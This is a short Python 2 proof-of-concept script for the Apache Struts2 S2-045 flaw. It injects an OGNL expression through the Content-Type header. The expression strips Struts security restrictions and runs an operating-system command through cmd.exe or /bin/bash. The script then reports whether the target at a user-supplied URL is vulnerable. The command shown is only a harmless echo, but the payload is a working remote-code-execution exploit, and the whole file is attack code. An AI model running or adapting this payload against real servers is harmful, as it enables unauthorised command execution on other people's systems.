#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
 
def poc(url):
    #payload = "%{(#test=‘multipart/form-data‘).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container‘]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
    header = {}
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    #header["Content-Type"] = payload
    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo s2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    r = requests.get(url, headers=header,timeout=3)
    content = r.content
    r.close()
    print content[0:300]
    if 's2-045' in content:
        return True
    return False

def isOrNot(url):
    if poc(url):
       print "VULNERABLE"
    else:
       print "not vulnerable"

if __name__ == '__main__':
    if len(sys.argv) == 2:
       isOrNot(sys.argv[1])
        
    else:
        while 1:
            try:
                url = raw_input('>>')
                if url=='q':
                    sys.exit();
                else:
                    print("url: "+url)
                    isOrNot(url)
            except Exception as e:
                print str(e)




